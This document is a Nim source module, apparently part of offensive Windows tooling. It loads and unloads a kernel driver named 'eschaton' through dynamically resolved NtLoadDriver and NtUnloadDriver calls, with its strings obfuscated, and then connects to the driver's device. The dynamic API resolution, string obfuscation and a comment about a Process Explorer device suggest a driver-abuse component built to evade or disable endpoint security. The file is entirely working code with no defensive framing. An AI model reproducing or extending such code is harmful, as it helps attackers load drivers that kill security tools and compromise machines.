import winim/[com, clr], std/strformat
import dinvoke
import obf

type NtLoadDriver_t = proc(DriverServiceName : PUNICODE_STRING) : HANDLE {.stdcall.}


proc load_driver*() = 
    var hNtdll = GetModuleHandleA(obf("Ntdll.dll"))
    if (hNtdll == 0):
        echo obf("[-] error can't find ntdll")
        quit(-1)

    var NtLoadDriver : NtLoadDriver_t

    NtLoadDriver = cast[NtLoadDriver_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(obf("ntdll.dll"), FALSE)), obf("NtLoadDriver"), 0, TRUE)))
    
    if (NtLoadDriver == nil):
        echo obf("[-] error can't find NtLoadDriver")
        quit(-1)

    var name : UNICODE_STRING

    RtlInitUnicodeString(addr(name), obf("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\eschaton"))

    var ret = NtLoadDriver(addr(name))
    if (ret != STATUS_SUCCESS and ret != STATUS_IMAGE_ALREADY_LOADED and ret != STATUS_OBJECT_NAME_COLLISION) :
        echo "[-] ntloaddriver error, can't load driver"
        quit()
    elif (ret == STATUS_SUCCESS) :
        echo "[+] driver loaded"
    elif (ret == STATUS_IMAGE_ALREADY_LOADED) :
        echo "already loaded"
    else :
        echo "should be working"

proc unload_driver*() =
    var hNtdll = GetModuleHandleA(obf("Ntdll.dll"))
    if (hNtdll == 0):
        echo "[-] error can't find ntdll"
        quit(-1)

    var NtLoadDriver : NtLoadDriver_t

    NtLoadDriver = cast[NtLoadDriver_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(obf("ntdll.dll"), FALSE)), obf("NtUnloadDriver"), 0, TRUE)))
    
    if (NtLoadDriver == nil):
        echo "[-] error can't find NtUnLoadDriver"
        quit(-1)

    var name : UNICODE_STRING

    RtlInitUnicodeString(addr(name), obf("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\eschaton"))

    var ret = NtLoadDriver(addr(name))
    if (ret != STATUS_SUCCESS and ret != STATUS_IMAGE_ALREADY_LOADED and ret != STATUS_OBJECT_NAME_COLLISION) :
        echo fmt"[-]NtUnloadDriver: {ret}"
        echo "[-] ntunloaddriver error"
    elif (ret == STATUS_SUCCESS) :
        echo "[+] driver unloaded"


proc connect_to_driver*(driver_name : string) : HANDLE =
    var driver_handle = CreateFileA(fmt"\\.\{driver_name}", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)

    #dump hProcExpDevice
    if (driver_handle == INVALID_HANDLE_VALUE) :
        echo "[-] invalid handle"
        echo "[-] cant connect to driver"
        quit()
    else :
        echo "[+] connected to driver"

    return driver_handle